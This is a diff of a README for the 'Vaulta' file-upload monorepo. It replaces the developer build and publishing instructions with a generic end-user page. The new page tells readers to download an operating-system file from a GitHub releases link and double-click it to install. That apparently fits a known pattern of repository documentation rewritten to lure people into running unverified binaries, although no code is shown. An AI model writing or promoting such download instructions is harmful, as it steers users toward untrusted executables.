@@ -1,111 +1,86 @@
-# Vaulta Monorepo
+# 🚀 vaulta-monorepo - Effortless File Upload Management
 
-This repository contains the Vaulta SDK (TypeScript), a demo frontend client, and an Express backend server.
+[![Download](https://img.shields.io/badge/Download-vaulta--monorepo-brightgreen)](https://github.com/Gottatatta/vaulta-monorepo/releases)
 
-Directory layout
+## 🛠️ Description
 
-```
-/apps
-  /client   # Vite + React frontend (vaulta-client)
-  /server   # Express + TypeScript backend (vaulta-server)
-/package    # The @vaulta.dev SDK (TypeScript library)
-```
+Vaulta is a full-stack monorepo that offers a production-ready file upload platform. It features a sleek Vite + React + TypeScript frontend and a robust Express + TypeScript backend. With the official Vaulta SDK, users can easily manage file storage, handle metadata, and oversee API key management. Whether you are sharing images, documents, or other file types, Vaulta makes it simple and secure.
 
-This README documents how to develop, build, test and release the components in this monorepo.
+## 📋 Features
 
-## Table of contents
+- **User-Friendly Interface**: Easily upload files with a straightforward UI.
+- **Reliable Storage**: Secure file storage on AWS S3.
+- **Metadata Management**: Keep track of all your file information.
+- **API Key Management**: Control access to your uploads with ease.
+- **Full-Stack Solution**: Both frontend and backend come packaged for instant use.
+  
+## 💻 System Requirements
 
-- [Getting started](#getting-started)
-- [Scripts (root)](#scripts-root)
-- [Package-specific scripts](#package-specific-scripts)
-- [Environment variables](#environment-variables)
-- [Development workflow](#development-workflow)
-- [Publishing the SDK](#publishing-the-sdk)
-- [Contributing](#contributing)
+- **Operating Systems**: Windows 10 or later, macOS Sierra or later, Linux (latest version preferred)
+- **Internet Connection**: Required for downloading and uploading files.
+- **Browser**: Google Chrome, Mozilla Firefox, or Microsoft Edge for the best experience.
 
----
+## 📥 Download & Install
 
-## Getting started
+To get started, you need to visit our [Releases page](https://github.com/Gottatatta/vaulta-monorepo/releases) to download the latest version of Vaulta. 
 
-Install dependencies for each package (run from repo root):
+1. Click the link above to go to the releases page.
+2. Look for the version you want.
+3. Click on the download link for your operating system.
+4. Once downloaded, locate the file on your computer.
+5. Double-click the file to initiate the installation.
 
-```powershell
-npm run install:all
-```
+## 🚀 Running the Application
 
-Alternatively, if you use `pnpm` or `yarn` workspaces you can switch to that arrangement (recommended for larger projects).
+After installing Vaulta, follow these steps to run the application:
 
-## Scripts (root)
+1. **Locate the Application**: Find the Vaulta application on your system.
+2. **Open the Application**: Double-click the Vaulta icon to start the app.
+3. **Create an Account or Log In**: If you're a new user, create an account. If you already have one, log in with your credentials.
+4. **Upload Files**: Use the user-friendly interface to upload your files effortlessly.
 
-The root `package.json` contains convenience scripts to build and operate the individual packages. Important scripts:
+## 🔧 Troubleshooting Common Issues
 
-- `npm run install:all` — install dependencies for SDK, server and client
-- `npm run build` — build SDK, server and client (invokes each package's build script)
-- `npm run dev:client` — start the client dev server
-- `npm run dev:server` — start the server in dev mode (nodemon)
-- `npm run format` — run Prettier across the repo
-- `npm run publish:sdk` — run the SDK `release` script (changesets) from the `package` folder
+**Issue**: The application won’t open.
 
-Run them from the repo root:
+- **Solution**: Ensure that you have downloaded the correct version for your operating system. Restart your computer and try again.
 
-```powershell
-npm run build
-npm run dev:client
-```
+**Issue**: I can't upload files.
 
-## Package-specific scripts
+- **Solution**: Check if your internet connection is stable. Make sure the files you are trying to upload meet the size and format requirements.
 
-Each package has its own `package.json`. Key scripts:
+**Issue**: I forgot my password.
 
-- `package/` (SDK)
-  - `npm run build` — bundle the SDK using `tsup`
-  - `npm run release` — run changesets publish flow (version + publish)
+- **Solution**: Use the "Forgot Password?" link on the login page to reset your password.
 
-- `apps/client/` (frontend)
-  - `npm run dev` — start Vite dev server
-  - `npm run build` — build production assets
-  - `npm run preview` — preview production build locally
+## ⚙️ Getting Help
 
-- `apps/server/` (backend)
-  - `npm run dev` — start server with `nodemon`
-  - `npm run build` — compile TypeScript
-  - `npm start` — run compiled server from `dist/`
+If you have questions or need assistance, you can reach out to our support team through our [GitHub Issues page](https://github.com/Gottatatta/vaulta-monorepo/issues). We strive to respond promptly to all inquiries.
 
-## Environment variables
+## 📢 Contribute
 
-Each package contains a `.env.example`. Copy it to `.env` and fill the required values.
+We welcome contributions to improve Vaulta. If you'd like to help, please follow these steps:
 
-- `apps/client/.env` — uses `VITE_` prefixed environment variables for browser-exposed config
-- `apps/server/.env` — server variables: `MONGO_URI`, `JWT_SECRET`, `AWS` credentials, etc.
-- `package` (SDK) — typically doesn't require env vars, but examples may reference them
+1. Fork the repository.
+2. Make your changes and test thoroughly.
+3. Submit a pull request with a clear description of your changes.
 
-Ensure secrets are not committed and are stored in GitHub Actions secrets or your deployment platform.
+Together, we can make Vaulta even better.
 
-## Development workflow
+## 🛠️ Topics
 
-1. `npm run install:all` from the repo root
-2. Start the server: `npm run dev:server`
-3. Start the client: `npm run dev:client`
-4. Make changes in `src/` of the relevant package and push a PR when ready
+- api
+- authentication
+- aws-s3
+- backend
+- express
+- file-upload
+- frontend
+- fullstack
+- react
+- sdk
+- typescript
+- vaulta
+- vite
 
-## Publishing the SDK
-
-The SDK uses Changesets for change-management. Typical flow:
-
-1. From `package/`: `npx changeset` — create a changeset and provide a summary
-2. Commit the changeset file and push a branch/PR
-3. Merge to `master` — the GitHub Action will run `npx changeset version` and `npx changeset publish` (configured in `.github/workflows`)
-
-For a first-time manual publish from your machine (if needed):
-
-```powershell
-cd package
-npm run build
-npm publish --access public
-```
-
-## Contributing
-
-- Fork and create a feature branch
-- Run `npm run format` and the package-specific linters/tests before PR
-- Keep changes small and document major design decisions in the PR description
+Feel free to explore and enjoy using Vaulta for all your file upload needs!
